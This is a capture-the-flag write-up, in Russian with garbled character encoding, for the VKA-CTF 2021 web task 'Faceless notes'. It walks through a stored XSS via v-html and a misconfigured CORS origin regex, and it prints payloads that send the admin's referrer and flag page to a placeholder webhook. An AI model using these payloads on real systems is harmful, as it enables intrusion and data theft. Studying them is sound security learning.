## –ë–µ–∑–ª–∏–∫–∏–µ –∑–∞–º–µ—Ç–∫–∏

| –°–æ–±—ã—Ç–∏–µ | –ù–∞–∑–≤–∞–Ω–∏–µ | –ö–∞—Ç–µ–≥–æ—Ä–∏—è | –°–ª–æ–∂–Ω–æ—Å—Ç—å |
| :------ | ---- | ---- | ---- |
| VKA-CTF`2021 | –ë–µ–∑–ª–∏–∫–∏–µ –∑–∞–º–µ—Ç–∫–∏ | Web | hard |

### –û–ø–∏—Å–∞–Ω–∏–µ

> –ê–≤—Ç–æ—Ä: [ ùïÇùï£ùïíùï¶ùï§ùïñ ]
>
> –û–¥–∏–Ω –∏–∑ –Ω–∞—à–∏—Ö –∞–≥–µ–Ω—Ç–æ–≤, –Ω–∞—Ö–æ–¥—è—â–∏–π—Å—è –≤ –∫–æ–º–ø–∞–Ω–∏–∏ –°–°–°–† 2.0 –∏ –ø—Ä–∏–±–ª–∏–∂–µ–Ω–Ω—ã–π –∫ —Ä—É–∫–æ–≤–æ–¥—Å—Ç–≤—É –Ω–∞ –ó–µ–º–ª–µ, –Ω–µ–¥–∞–≤–Ω–æ –¥–æ–ª–æ–∂–∏–ª, —á—Ç–æ —É –Ω–∏—Ö –µ—Å—Ç—å [–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ](https://main.beautiful-notes.ml) –¥–ª—è –∞–Ω–æ–Ω–∏–º–Ω–æ–≥–æ —Å–æ–∑–¥–∞–Ω–∏—è –∑–∞–º–µ—Ç–æ–∫, –∫–æ—Ç–æ—Ä—ã–º–∏ –æ–Ω–∏ –¥–µ–ª—è—Ç—Å—è —Å –ø—Ä–∞–≤–∏—Ç–µ–ª—å—Å—Ç–≤–æ–º –ó–µ–º–ª–∏. –ê–≥–µ–Ω—Ç —Å–º–æ–≥ –≤—ã—Ç–∞—â–∏—Ç—å –∏—Å—Ö–æ–¥–Ω—ã–µ –∫–æ–¥—ã –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è, –Ω–æ –≤–æ—Ç –ø—Ä–æ–∞–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å –∏—Ö –∏ —Å–¥–µ–ª–∞—Ç—å –≤—ã–≤–æ–¥—ã —É –Ω–µ–≥–æ –Ω–µ —Ö–≤–∞—Ç–∞–µ—Ç –∑–Ω–∞–Ω–∏–π! –¢–∞–∫–∂–µ –æ–Ω —É–∑–Ω–∞–ª, —á—Ç–æ –µ—Å–ª–∏ –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞, —Ç–æ –∫–æ–º–ø–∞–Ω–∏—è –ö–æ—Å–º–æ—Å –• —Å–º–æ–∂–µ—Ç —Ç–∞–π–Ω–æ –ø–æ–¥—Å–ª—É—à–∏–≤–∞—Ç—å –≤—Å–µ –æ–±—Ä–∞—â–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π. –ù—É–∂–Ω–æ –ø–æ–ª—É—á–∏—Ç—å –µ–≥–æ –∫–∞–∫ –º–æ–∂–Ω–æ —Å–∫–æ—Ä–µ–µ! –í—Ä–µ–º—è —É—Ö–æ–¥–∏—Ç, –æ–Ω–∏ –º–æ–≥—É—Ç –≤ –ª—é–±–æ–π –º–æ–º–µ–Ω—Ç —É–∑–Ω–∞—Ç—å –æ–± —É—Ç–µ—á–∫–µ. –ü–æ—Ç–æ—Ä–æ–ø–∏—Ç–µ—Å—å, –º—ã –Ω–µ –∑–∞–±—É–¥–µ–º –Ω–∞—à–∏—Ö –≥–µ—Ä–æ–µ–≤!

### –†–µ—à–µ–Ω–∏–µ
![](images/main.png)

–ü—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –ø–æ–∑–≤–æ–ª—è–µ—Ç —Å–æ–∑–¥–∞—Ç—å –ª–∏—á–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç, –¥–æ–±–∞–≤–∏—Ç—å –∑–∞–º–µ—Ç–∫–∏ –∏ –ø–æ–¥–µ–ª–∏—Ç—å—Å—è –∏–º–∏ —Å –∞–¥–º–∏–Ω–æ–º.

–ò–∑ –∏—Å—Ö–æ–¥–Ω–æ–≥–æ –∫–æ–¥–∞ –º–æ–∂–Ω–æ –ø–æ–Ω—è—Ç—å, —á—Ç–æ –µ—Å–ª–∏ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –∑–∞–º–µ—Ç–∫–∏ –¥–æ–±–∞–≤–∏—Ç—å –ø–æ–ª–µ `style`, —Ç–æ –¥–∞–Ω–Ω–∞—è –∑–∞–º–µ—Ç–∫–∞ –±—É–¥–µ—Ç –æ—Ç–æ–±—Ä–∞–∂–∞—Ç—å—Å—è –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ –Ω–µ–±–µ–∑–æ–ø–∞—Å–Ω—ã–º —Å–ø–æ—Å–æ–±–æ–º (`XSS`):

```html
<p
    v-if="post.style"
    v-html="postWithStyles(post)">
</p>
<p v-else>
    {{post.content}}
</p>
```

–î–æ–º–µ–Ω –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞ —Å–∫—Ä—ã—Ç. –ò—Å–ø–æ–ª—å–∑—É—è —É—è–∑–≤–∏–º–æ—Å—Ç—å XSS –º–æ–∂–Ω–æ —É–∑–Ω–∞—Ç—å –ø–æ–ª–µ `Referrer`. –î–ª—è —ç—Ç–æ–≥–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —Å–æ–∑–¥–∞—Ç—å –∑–∞–º–µ—Ç–∫—É —Å–ª–µ–¥—É—é—â–∏–º –∑–∞–ø—Ä–æ—Å–æ–º –∏ –ø–æ–¥–µ–ª–∏—Ç—å—Å—è –µ–π —Å –∞–¥–º–∏–Ω–æ–º:

```json
{
    "title":"krause",
    "content":"<input autofocus onfocus=location.replace(`http://<webhook>/${btoa(document.referrer)}`)></input>",
    "style":"background-color:black;"
}
```

–ó–Ω–∞—è –¥–æ–º–µ–Ω, –º—ã –º–æ–∂–µ–º –∑–∞—Å—Ç–∞–≤–∏—Ç—å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –ø–æ–ª—É—á–∏—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã `/iwantflag` –∏ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –µ–≥–æ –Ω–∞–º, –Ω–æ —Å–¥–µ–ª–∞—Ç—å —ç—Ç–æ —Å –ø–æ–¥–¥–æ–º–µ–Ω–∞ `main` –Ω–∞–º –∑–∞–ø—Ä–µ—â–∞–µ—Ç –º–µ–∑–∞–Ω–∏–∑–º –∑–∞—â–∏—Ç—ã `CORS` (Mixed Content).

![](images/mixed-content.png)

–ú–æ–∂–Ω–æ –∑–∞–º–µ—Ç–∏—Ç—å, —á—Ç–æ —Ä–µ–≥—É–ª—è–Ω–æ–µ –≤—ã—Ä–∞–∂–µ–Ω–∏–µ, –∫–æ—Ç–æ—Ä–æ–µ –æ–ø–∏—Å—ã–≤–∞–µ—Ç –∑–∞–≥–æ–ª–æ–≤–æ–∫ `Access-Control-Allow-Origin` –Ω–∞—Å—Ç—Ä–æ–µ–Ω–æ –Ω–µ–≤–µ—Ä–Ω–æ:
```js
const any_subdomain = new RegExp(`http:\/\/.*${process.env.MAIN_DOMAIN}$`)
```
–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–≤ —Å–≤–æ–π –¥–æ–º–µ–Ω, –∫–æ—Ç–æ—Ä—ã–π –æ–∫–∞–Ω—á–∏–≤–∞–µ—Ç—Å—è –Ω–∞ `beautifyl-notes.ml`, –º—ã –º–æ–∂–µ–º —Ä–∞–∑–º–µ—Å—Ç–∏—Ç—å –Ω–∞ –Ω—ë–º JS –∫–æ–¥, –∫–æ—Ç–æ—Ä—ã–π –∑–∞—Å—Ç–∞–≤–∏—Ç –∞–¥–º–∏–Ω–∞ –ø–æ–ª—É—á–∏—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã —Å —Ñ–ª–∞–≥–æ–º:
```js
fetch('http://adminsubdomain.beautiful-notes.ml/iwantflag')
.then(response => response.text())
.then(data => fetch(`http://<webhook>/&flag=${unescape(encodeURIComponent(data))}`)));
```

–ü–æ–¥–æ–∂–¥–∞–≤ –Ω–µ –±–æ–ª—å—à–µ –º–∏–Ω—É—Ç—ã –ø–æ–ª—É—á–∞–µ–º —Ñ–ª–∞–∂–æ–∫

**–§–ª–∞–≥:**

> vka{c0r5_m15c0nf16_4nd_x55}